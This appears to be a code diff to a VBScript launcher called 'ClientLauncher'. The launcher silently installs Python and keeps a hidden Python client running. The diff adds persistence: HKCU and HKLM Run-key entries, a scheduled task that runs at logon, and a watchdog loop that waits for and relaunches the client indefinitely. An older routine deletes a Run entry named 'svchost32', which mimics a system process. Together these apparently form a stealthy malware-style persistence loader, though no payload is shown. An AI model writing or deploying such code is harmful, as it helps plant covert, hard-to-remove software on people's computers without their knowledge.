@@ -10,6 +10,7 @@ Dim sh, fso
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 Dim arch: arch = LCase(sh.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%"))
+Dim setupOnly: setupOnly = False
 Const EXPECTED_SHA256 = ""
 Const REG_DEBUG_KEY = "HKCU\Software\NCH\ClientLauncher\DebugEnabled"
 Const REG_SHOW_CLIENT_CONSOLE = "HKCU\Software\NCH\ClientLauncher\ShowClientConsole"
@@ -77,11 +78,7 @@ Sub DebugPrint(s)
   Log s
 End Sub
 Function WindowStyle()
-  If DebugEnabled() Then
-    WindowStyle = 1
-  Else
-    WindowStyle = 0
-  End If
+  If ShowClientConsoleEnabled() Then WindowStyle = 1 Else WindowStyle = 0
 End Function
 
 ' Handle CLI debug toggles
@@ -132,13 +129,22 @@ Sub HandleDebugCLI()
           WScript.Echo "ShowSubprocWindows = " & CStr(ShowSubprocWindowsEnabled())
         End If
       End If
+    ElseIf Left(arg, 6) = "/setup" Or Left(arg, 6) = "setup:" Then
+      Dim p4: p4 = Split(Replace(arg, "/setup", "setup", 1, 1, vbTextCompare), ":")
+      If UBound(p4) >= 1 Then
+        val = p4(1)
+        If val = "on" Or val = "1" Or val = "true" Then
+          setupOnly = True
+          WScript.Echo "Setup-only mode: will configure autorun and exit"
+        End If
+      End If
     End If
   Next
 End Sub
 HandleDebugCLI
 
-' If debug is enabled and we are not in console host, re-launch under cscript with visible console
-If DebugEnabled() And Not IsConsoleHost() Then
+' Only re-launch under cscript when explicit show-client-console is ON
+If DebugEnabled() And ShowClientConsoleEnabled() And Not IsConsoleHost() Then
   On Error Resume Next
   Dim args, j
   args = ""
@@ -175,8 +181,40 @@ Sub EnsureAutorun()
   runKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher"
   cmd = "wscript.exe """ & dest & """"
   sh.RegWrite runKey, cmd, "REG_SZ"
+  On Error Resume Next
+  sh.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher", cmd, "REG_SZ"
+  On Error GoTo 0
 End Sub
 EnsureAutorun
+Sub EnsureScheduledTask()
+  On Error Resume Next
+  Dim dest, name, query, hasRun, hklmRun
+  dest = safeDir & "\ClientService.vbs"
+  name = "ClientLauncher"
+  hasRun = ""
+  On Error Resume Next
+  hasRun = RegReadDefault("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher", "")
+  hklmRun = RegReadDefault("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ClientLauncher", "")
+  On Error GoTo 0
+  If CStr(hasRun) <> "" Or CStr(hklmRun) <> "" Then
+    query = ExecOut("schtasks /Query /TN " & name)
+    If Not (InStr(1, LCase(query), "cannot find", vbTextCompare) > 0 Or Len(Trim(query)) = 0) Then
+      ExecOut "schtasks /Change /TN " & name & " /Disable"
+    End If
+    Exit Sub
+  End If
+  query = ExecOut("schtasks /Query /TN " & name)
+  If InStr(1, LCase(query), "cannot find", vbTextCompare) > 0 Or Len(Trim(query)) = 0 Then
+    Dim createCmd
+    createCmd = "schtasks /Create /TN " & name & " /SC ONLOGON /RL LIMITED /TR ""wscript.exe """ & dest & """" & """ /F"
+    ExecOut createCmd
+  End If
+End Sub
+EnsureScheduledTask
+If setupOnly Then
+  DebugPrint "Setup-only mode: exiting after configuration"
+  WScript.Quit 0
+End If
 Sub RemoveLegacyAutorun()
   On Error Resume Next
   sh.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svchost32"
@@ -191,35 +229,26 @@ Sub Log(s)
 End Sub
 Function ExecOut(cmd)
   On Error Resume Next
-  Dim tmp, rc, out
-  Randomize
-  tmp = logDir & "\out_" & Replace(Replace(Replace(CStr(Now), ":", "_"), " ", "_"), "/", "_") & "_" & CStr(Int(Rnd * 1000000)) & ".txt"
+  Dim o, out
   If DebugEnabled() Then DebugPrint "Exec: " & cmd
-  Dim style: style = 0
-  If DebugEnabled() And ShowSubprocWindowsEnabled() Then style = 1 Else style = 0
-  If LCase(Left(cmd, 7)) = "cmd /c " Then
-    rc = sh.Run(cmd & " > """ & tmp & """ 2>&1", style, True)
-  Else
-    rc = sh.Run("cmd /c " & cmd & " > """ & tmp & """ 2>&1", style, True)
-  End If
-  out = ReadText(tmp)
-  If fso.FileExists(tmp) Then
-    On Error Resume Next
-    fso.DeleteFile tmp, True
-    On Error GoTo 0
+  Set o = sh.Exec(cmd)
+  out = ""
+  If Not o Is Nothing Then
+    out = o.StdOut.ReadAll
+    If out = "" Then out = o.StdErr.ReadAll
   End If
   ExecOut = out
 End Function
 Function FindPythonw()
   On Error Resume Next
   Dim out, lines, i, p
-  out = ExecOut("cmd /c where pythonw.exe")
+  out = ExecOut("where.exe pythonw.exe")
   lines = Split(out, vbCrLf)
   For i = 0 To UBound(lines)
     p = Trim(lines(i))
     If p <> "" And fso.FileExists(p) Then FindPythonw = p : Exit Function
   Next
-  out = ExecOut("cmd /c where python.exe")
+  out = ExecOut("where.exe python.exe")
   lines = Split(out, vbCrLf)
   For i = 0 To UBound(lines)
     p = Trim(lines(i))
@@ -234,7 +263,7 @@ Function FindPythonw()
 End Function
 Function FileSHA256(path)
   On Error Resume Next
-  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ SHA256")
+  Dim out: out = ExecOut("certutil -hashfile """ & path & """ SHA256")
   Dim lines: lines = Split(out, vbCrLf)
   Dim i, h: h = ""
   For i = 0 To UBound(lines)
@@ -247,7 +276,7 @@ Function FileSHA256(path)
 End Function
 Function FileMD5(path)
   On Error Resume Next
-  Dim out: out = ExecOut("cmd /c certutil -hashfile """ & path & """ MD5")
+  Dim out: out = ExecOut("certutil -hashfile """ & path & """ MD5")
   Dim lines: lines = Split(out, vbCrLf)
   Dim i, h: h = ""
   For i = 0 To UBound(lines)
@@ -398,9 +427,9 @@ Function IsOnline()
 End Function
 Function PythonAvailable()
   On Error Resume Next
-  Dim out: out = ExecOut("cmd /c py -3 -V")
+  Dim out: out = ExecOut("py -3 -V")
   If InStr(out, "Python 3") > 0 Then PythonAvailable = True : Exit Function
-  out = ExecOut("cmd /c python.exe -V")
+  out = ExecOut("python.exe -V")
   If InStr(out, "Python 3") > 0 Then PythonAvailable = True Else PythonAvailable = False
 End Function
 Sub EnsurePython()
@@ -413,7 +442,6 @@ Sub EnsurePython()
   If InStr(arch, "64") > 0 Then
     url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8-amd64.exe"
   Else
-    url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
     url = "https://www.python.org/ftp/python/3.12.8/python-3.12.8.exe"
   End If
   installer = logDir & "\python312.exe"
@@ -600,13 +628,25 @@ Sub Main()
   End If
   EnsurePython()
   Dim cp: cp = FindClientPy()
-  If cp = "" Then DebugPrint "client.py unavailable" : Exit Sub
+  If cp = "" Then
+    DebugPrint "client.py unavailable; will retry periodically"
+    Do
+      WScript.Sleep 60000
+      cp = FindClientPy()
+      If cp <> "" Then Exit Do
+    Loop
+  End If
   TerminateExisting
   LaunchClient cp : WScript.Sleep 3000
   Do
     If Not IsRunning() Then
+      DebugPrint "Client not running; attempting restart"
       cp = FindClientPy()
-      If cp <> "" Then LaunchClient cp
+      If cp <> "" Then
+        LaunchClient cp
+      Else
+        DebugPrint "Client path not available; retry after delay"
+      End If
     End If
     WScript.Sleep 10000
   Loop
